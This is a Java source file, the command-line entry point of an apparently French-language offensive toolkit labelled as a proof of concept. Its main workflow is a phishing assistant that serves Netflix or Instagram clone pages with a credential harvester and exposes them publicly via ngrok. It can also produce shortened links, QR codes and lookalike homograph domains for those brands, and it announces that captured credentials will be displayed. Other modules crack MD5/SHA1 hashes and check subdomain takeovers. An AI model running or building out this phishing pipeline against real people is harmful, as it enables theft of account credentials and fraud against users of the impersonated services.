package fr.redteam;

import fr.redteam.core.DefaultReport;
import fr.redteam.core.Module;
import fr.redteam.core.Report;
import fr.redteam.core.Target;
import fr.redteam.credential.HashCracker;
import fr.redteam.credential.PasswordStrengthAnalyzer;
import fr.redteam.output.ConsoleReporter;
import fr.redteam.output.Reporter;
import fr.redteam.phishing.HomographGenerator;
import fr.redteam.phishing.QrCodeGenerator;
import fr.redteam.recon.SubdomainTakeoverChecker;
import fr.redteam.util.Ansi;
import fr.redteam.util.NgrokHelper;
import fr.redteam.web.CredentialHarvester;
import fr.redteam.web.PhishingHttpServer;
import fr.redteam.web.PhishingPageGenerator;
import fr.redteam.web.UrlShortener;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Scanner;


public class RedTeamCli {

    private static final String LOGO =
            "\n" +
            "RRRRRRRRRRRRRRRRR   EEEEEEEEEEEEEEEEEEEEEEDDDDDDDDDDDDD       TTTTTTTTTTTTTTTTTTTTTTT     OOOOOOOOO          OOOOOOOOO     LLLLLLLLLLL             \n" +
            "R::::::::::::::::R  E::::::::::::::::::::ED::::::::::::DDD    T:::::::::::::::::::::T   OO:::::::::OO      OO:::::::::OO   L:::::::::L             \n" +
            "R::::::RRRRRR:::::R E::::::::::::::::::::ED:::::::::::::::DD  T:::::::::::::::::::::T OO:::::::::::::OO  OO:::::::::::::OO L:::::::::L             \n" +
            "RR:::::R     R:::::REE::::::EEEEEEEEE::::EDDD:::::DDDDD:::::D T:::::TT:::::::TT:::::TO:::::::OOO:::::::OO:::::::OOO:::::::OLL:::::::LL             \n" +
            "  R::::R     R:::::R  E:::::E       EEEEEE  D:::::D    D:::::DTTTTTT  T:::::T  TTTTTTO::::::O   O::::::OO::::::O   O::::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E:::::E               D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::RRRRRR:::::R   E::::::EEEEEEEEEE     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R:::::::::::::RR    E:::::::::::::::E     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::RRRRRR:::::R   E:::::::::::::::E     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E::::::EEEEEEEEEE     D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E:::::E               D:::::D     D:::::D       T:::::T        O:::::O     O:::::OO:::::O     O:::::O  L:::::L               \n" +
            "  R::::R     R:::::R  E:::::E       EEEEEE  D:::::D    D:::::D        T:::::T        O::::::O   O::::::OO::::::O   O::::::O  L:::::L         LLLLLL\n" +
            "RR:::::R     R:::::REE::::::EEEEEEEE:::::EDDD:::::DDDDD:::::D       TT:::::::TT      O:::::::OOO:::::::OO:::::::OOO:::::::OLL:::::::LLLLLLLLL:::::L\n" +
            "R::::::R     R:::::RE::::::::::::::::::::ED:::::::::::::::DD        T:::::::::T       OO:::::::::::::OO  OO:::::::::::::OO L::::::::::::::::::::::L\n" +
            "R::::::R     R:::::RE::::::::::::::::::::ED::::::::::::DDD          T:::::::::T         OO:::::::::OO      OO:::::::::OO   L::::::::::::::::::::::L\n" +
            "RRRRRRRR     RRRRRRREEEEEEEEEEEEEEEEEEEEEEDDDDDDDDDDDDD             TTTTTTTTTTT           OOOOOOOOO          OOOOOOOOO     LLLLLLLLLLLLLLLLLLLLLLLL\n" +
            "\n";

    private static final String SEP = "══════════════════════════════════════════════════════";
    private static final String SEP_THIN = "──────────────────────────────────────────────────────────";

    private final Map<String, Module> modules = new LinkedHashMap<>();
    private final Reporter reporter = new ConsoleReporter();

    public RedTeamCli() {
        register(new HashCracker());
        register(new CredentialHarvester());
        register(new QrCodeGenerator());
        register(new SubdomainTakeoverChecker());
        register(new UrlShortener());
        register(new PasswordStrengthAnalyzer());
        register(new HomographGenerator());
    }

    private void register(Module m) {
        modules.put(m.getName().toLowerCase(), m);
    }

    public void printLogo() {
        System.out.println(Ansi.RED + LOGO + Ansi.RESET);
        System.out.println(Ansi.BOLD + Ansi.CYAN + "  Offensive Security (PoC)" + Ansi.RESET);
        System.out.println();
    }

    public void run(String[] args) {
        printLogo();
        if (args.length > 0 && "list".equalsIgnoreCase(args[0])) {
            listModules();
            return;
        }
        if (args.length > 0 && "run".equalsIgnoreCase(args[0])) {
            String name = args.length > 1 ? args[1] : null;
            String host = args.length > 2 ? args[2] : "127.0.0.1";
            int port = args.length > 3 ? parseInt(args[3], -1) : -1;
            runModule(name, host, port);
            return;
        }
        runInteractive();
    }

    private void listModules() {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Modules disponibles"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        for (Module m : modules.values()) {
            System.out.println("  " + Ansi.green(m.getName()) + Ansi.dim(" - " + m.getDescription()));
        }
    }

    private void runModule(String name, String host, int port) {
        if (name == null || name.isEmpty()) {
            System.out.println("Usage: run <module_name> [host] [port]");
            listModules();
            return;
        }
        Module m = modules.get(name.toLowerCase());
        if (m == null) {
            System.out.println("Module inconnu: " + name);
            listModules();
            return;
        }
        Target target = new Target(host, port > 0 ? port : -1);
        Report report = new DefaultReport();
        m.run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Rapport " + m.getName()));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runInteractive() {
        try (Scanner scan = new Scanner(System.in)) {
            while (true) {
                System.out.println(Ansi.CYAN + "\n  " + SEP + Ansi.RESET);
                System.out.println(Ansi.bold("  MENU PRINCIPAL"));
                System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
                System.out.println("  " + Ansi.green("[1]") + " Phishing " + Ansi.dim("(serveur, QR, shortener, homograph)"));
                System.out.println("  " + Ansi.green("[2]") + " HashCracker " + Ansi.dim("(crack MD5/SHA1 par wordlist)"));
                System.out.println("  " + Ansi.green("[3]") + " Subdomain Takeover " + Ansi.dim("(détecte vulnérabilités)"));
                System.out.println("  " + Ansi.green("[4]") + " Password Strength " + Ansi.dim("(analyse force)"));
                System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
                System.out.print("  " + Ansi.bold("Choix") + " › ");
                String line = scan.nextLine();
                if (line == null) break;
                line = line.trim();
                if ("1".equals(line)) { runPhishingMenu(scan); continue; }
                if ("2".equals(line)) { runHashCracker(scan); continue; }
                if ("3".equals(line)) { runSubdomainTakeover(scan); continue; }
                if ("4".equals(line)) { runPasswordStrength(scan); continue; }
                System.out.println(Ansi.red("  ✗ Choix invalide."));
            }
        }
    }

    private void runHashCracker(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  HashCracker"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Hash MD5/SHA1 ou chemin fichier › ");
        String input = scan.nextLine();
        String hashOrPath = (input != null && !input.trim().isEmpty()) ? input.trim() : "";
        Target target = new Target(hashOrPath, -1);
        Report report = new DefaultReport();
        Module hashCracker = modules.get("hashcracker");
        hashCracker.run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Rapport HashCracker"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runPhishingMenu(Scanner scan) {
        runPhishingAssistant(scan);
    }

    /**
     * Assistant phishing séquentiel : pose toutes les questions, puis lance localhost + ngrok avec les options choisies.
     */
    private void runPhishingAssistant(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP + Ansi.RESET);
        System.out.println(Ansi.bold("  Assistant Phishing"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);

        // Étape 1 : Template
        System.out.println("  " + Ansi.bold("1)") + " Choisissez le template :");
        System.out.println("     " + Ansi.green("[1]") + " Netflix");
        System.out.println("     " + Ansi.green("[2]") + " Instagram");
        System.out.print("     Choix › ");
        String tChoice = scan.nextLine();
        if (tChoice == null) tChoice = "";
        tChoice = tChoice.trim();
        String[] names = PhishingPageGenerator.TEMPLATE_NAMES;
        String template = null;
        int tIdx = parseInt(tChoice, 0);
        if (tIdx >= 1 && tIdx <= names.length) template = names[tIdx - 1];
        else {
            System.out.println(Ansi.red("  ✗ Choix invalide."));
            return;
        }

        // Étape 2 : QR code
        System.out.print("  " + Ansi.bold("2)") + " Générer un QR code ? (o/n) › ");
        boolean wantQr = askYesNo(scan);

        // Étape 3 : URL shortener
        System.out.print("  " + Ansi.bold("3)") + " Activer l'URL shortener ? (o/n) › ");
        boolean wantShortener = askYesNo(scan);

        // Étape 4 : Homograph
        System.out.print("  " + Ansi.bold("4)") + " Générer des domaines homographes ? (o/n) › ");
        boolean wantHomograph = askYesNo(scan);

        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Lancement en cours..."));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);

        int port = 8080;
        int shortenerPort = 9090;
        PhishingHttpServer srv = null;
        Process ngrokProcess = null;
        boolean shortenerStarted = false;

        try {
            // Démarrer le serveur phishing
            srv = new PhishingHttpServer("127.0.0.1", port, new PhishingPageGenerator(), new CredentialHarvester(), template);
            srv.start();

            // Lancer ngrok
            ngrokProcess = NgrokHelper.startNgrok(port);
            String publicUrl = null;
            if (ngrokProcess != null) {
                try {
                    Thread.sleep(2500);
                    publicUrl = NgrokHelper.getPublicUrl(5, 500);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
            if (publicUrl == null || publicUrl.isEmpty()) {
                publicUrl = "http://127.0.0.1:" + port;
                System.out.println(Ansi.yellow("  ⚠ ngrok non disponible, utilisation de " + publicUrl));
            }

            String finalUrl = publicUrl;
            if (wantShortener) {
                UrlShortener.startServer(shortenerPort, publicUrl);
                shortenerStarted = true;
                finalUrl = UrlShortener.getShortUrl(shortenerPort);
            }

            // QR code
            String qrFilePath = null;
            if (wantQr) {
                Target qrTarget = new Target(publicUrl, -1);
                Report qrReport = new DefaultReport();
                modules.get("qrcodegenerator").run(qrTarget, qrReport);
                for (String f : qrReport.getFindings()) {
                    if (f.contains("Fichier généré:")) {
                        qrFilePath = f.replaceFirst(".*Fichier généré:\\s*", "").replaceAll("\\[QrCodeGenerator\\]\\s*", "").trim();
                        break;
                    }
                }
            }

            // Homograph (template = "netflix" ou "instagram", pas "netflix.com")
            String domainForHomograph = "netflix".equals(template) ? "netflix.com" : "instagram.com";
            java.util.List<String> homographVariants = new java.util.ArrayList<>();
            if (wantHomograph) {
                Target homTarget = new Target(domainForHomograph, -1);
                Report homReport = new DefaultReport();
                modules.get("homographgenerator").run(homTarget, homReport);
                for (String f : homReport.getFindings()) {
                    if (f.contains("  → ")) {
                        String msg = f.replaceAll("\\[HomographGenerator\\]\\s*", "").replaceFirst("^\\s*→\\s*", "").trim();
                        homographVariants.add(msg);
                    }
                }
            }

            // Récapitulatif
            System.out.println(Ansi.GREEN + "\n  " + SEP + Ansi.RESET);
            System.out.println(Ansi.bold("  ✓ Phishing actif"));
            System.out.println(Ansi.GREEN + "  " + SEP_THIN + Ansi.RESET);
            System.out.println("  " + Ansi.cyan("Template") + "   › " + Ansi.green(template));
            System.out.println("  " + Ansi.cyan("URL ngrok") + "  › " + Ansi.bold(publicUrl));
            if (wantShortener) {
                System.out.println("  " + Ansi.cyan("Shortener") + " › " + Ansi.bold(finalUrl));
            }
            if (wantQr && qrFilePath != null) {
                System.out.println("  " + Ansi.cyan("QR") + "       › " + Ansi.bold(qrFilePath));
            }
            if (wantHomograph && !homographVariants.isEmpty()) {
                System.out.println("  " + Ansi.cyan("Homograph") + " › " + domainForHomograph + Ansi.dim(" (") + homographVariants.size() + Ansi.dim(" variantes)"));
                for (int i = 0; i < Math.min(5, homographVariants.size()); i++) {
                    System.out.println("    " + Ansi.dim("→ ") + homographVariants.get(i));
                }
                if (homographVariants.size() > 5) {
                    System.out.println("    " + Ansi.dim("... et " + (homographVariants.size() - 5) + " autres"));
                }
            }
            System.out.println(Ansi.dim("  Les identifiants et clics s'afficheront ici."));
            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
            System.out.print(Ansi.dim("  [Entrée] pour arrêter et revenir au menu › "));
            scan.nextLine();

        } catch (Exception e) {
            System.out.println(Ansi.red("  ✗ Erreur: " + e.getMessage()));
        } finally {
            if (srv != null) srv.stop();
            if (shortenerStarted) UrlShortener.stopServer();
            if (ngrokProcess != null && ngrokProcess.isAlive()) ngrokProcess.destroyForcibly();
        }
    }

    private static boolean askYesNo(Scanner scan) {
        String line = scan.nextLine();
        if (line == null) return false;
        return line.trim().toLowerCase().startsWith("o") || line.trim().toLowerCase().equals("y");
    }

    private void startPhishingServer(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Serveur Phishing"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.println("  Choisissez le template :");
        System.out.println("  " + Ansi.green("[1]") + " Netflix");
        System.out.println("  " + Ansi.green("[2]") + " Instagram");
        System.out.print("  Choix › ");
        String choice = scan.nextLine();
        if (choice != null) choice = choice.trim();
        String[] names = PhishingPageGenerator.TEMPLATE_NAMES;
        String template = null;
        int idx = parseInt(choice, 0);
        if (idx >= 1 && idx <= names.length) {
            template = names[idx - 1];
        }
        int port = 8080;
        String host = "127.0.0.1";
        try {
            PhishingHttpServer srv = new PhishingHttpServer(host, port, new PhishingPageGenerator(), new CredentialHarvester(), template);
            srv.start();
            System.out.println(Ansi.GREEN + "\n  " + SEP + Ansi.RESET);
            System.out.println(Ansi.bold("  ✓ Serveur démarré"));
            System.out.println(Ansi.GREEN + "  " + SEP_THIN + Ansi.RESET);
            System.out.println("  " + Ansi.cyan("URL") + "  › " + Ansi.bold("http://" + host + ":" + port));
            System.out.println("  " + Ansi.cyan("Template") + " › " + (template != null ? Ansi.green(template) : Ansi.yellow("choix via URL")));
            System.out.println(Ansi.dim("  Les identifiants s'afficheront ici."));
            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
            System.out.print(Ansi.dim("  [Entrée] pour revenir au menu › "));
            scan.nextLine();
        } catch (Exception e) {
            System.out.println(Ansi.red("  ✗ Erreur: " + e.getMessage()));
        }
    }

    private void runQrCodeGenerator(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  QR Code Generator"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  URL cible (ex. http://localhost:8080) › ");
        String url = scan.nextLine();
        if (url != null) url = url.trim();
        Target target = new Target(url != null ? url : "", -1);
        Report report = new DefaultReport();
        modules.get("qrcodegenerator").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runSubdomainTakeover(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Subdomain Takeover Checker"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Domaine cible (ex. example.com) › ");
        String domain = scan.nextLine();
        if (domain != null) domain = domain.trim();
        Target target = new Target(domain != null ? domain : "", -1);
        Report report = new DefaultReport();
        modules.get("subdomaintakeoverchecker").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void startUrlShortener(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  URL Shortener"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  URL de destination (ex. http://localhost:8080) › ");
        String destUrl = scan.nextLine();
        if (destUrl == null || destUrl.trim().isEmpty()) {
            System.out.println(Ansi.red("  ✗ URL vide."));
            return;
        }
        destUrl = destUrl.trim();
        if (!destUrl.startsWith("http://") && !destUrl.startsWith("https://")) destUrl = "http://" + destUrl;
        int port = 9090;
        try {
            UrlShortener.startServer(port, destUrl);
            String shortUrl = UrlShortener.getShortUrl(port);
            System.out.println(Ansi.GREEN + "\n  " + SEP + Ansi.RESET);
            System.out.println(Ansi.bold("  ✓ Serveur démarré"));
            System.out.println(Ansi.GREEN + "  " + SEP_THIN + Ansi.RESET);
            System.out.println("  " + Ansi.cyan("URL courte") + " › " + Ansi.bold(shortUrl));
            System.out.println("  " + Ansi.cyan("Redirige vers") + " › " + destUrl);
            System.out.println(Ansi.dim("  Les clics s'afficheront ici."));
            System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
            System.out.print(Ansi.dim("  [Entrée] pour revenir au menu › "));
            scan.nextLine();
            UrlShortener.stopServer();
        } catch (Exception e) {
            System.out.println(Ansi.red("  ✗ Erreur: " + e.getMessage()));
        }
    }

    private void runPasswordStrength(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Password Strength Analyzer"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Mot de passe à analyser › ");
        String password = scan.nextLine();
        if (password != null) password = password.trim();
        Target target = new Target(password != null ? password : "", -1);
        Report report = new DefaultReport();
        modules.get("passwordstrengthanalyzer").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private void runHomographGenerator(Scanner scan) {
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        System.out.println(Ansi.bold("  Homograph Domain Generator"));
        System.out.println(Ansi.CYAN + "  " + SEP_THIN + Ansi.RESET);
        System.out.print("  Domaine cible (ex. google.com) › ");
        String domain = scan.nextLine();
        if (domain != null) domain = domain.trim();
        Target target = new Target(domain != null ? domain : "", -1);
        Report report = new DefaultReport();
        modules.get("homographgenerator").run(target, report);
        System.out.println(Ansi.CYAN + "\n  " + SEP_THIN + Ansi.RESET);
        reporter.output(report);
    }

    private static int parseInt(String s, int def) {
        if (s == null || s.isEmpty()) return def;
        try {
            return Integer.parseInt(s);
        } catch (NumberFormatException e) {
            return def;
        }
    }
}
